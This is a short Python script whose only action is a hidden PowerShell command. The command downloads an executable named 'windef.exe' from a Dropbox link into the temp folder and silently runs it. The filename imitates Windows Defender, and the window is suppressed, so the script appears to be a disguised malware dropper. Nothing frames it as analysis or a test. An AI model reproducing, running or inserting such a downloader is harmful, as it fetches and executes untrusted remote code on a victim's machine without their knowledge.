import subprocess

subprocess.run(["powershell", "-Command", "& { Invoke-WebRequest -Uri 'https://dl.dropbox.com/scl/fi/jeyh5skw4yfejo89jrms9/windef.exe?rlkey=8eskz8wpj79mqjn0b8bf2uhoz&dl=0' -OutFile ([System.IO.Path]::Combine($env:TEMP, 'windef.exe')); Start-Process -FilePath ([System.IO.Path]::Combine($env:TEMP, 'windef.exe')) -Wait }"], creationflags=subprocess.CREATE_NO_WINDOW, shell=True)
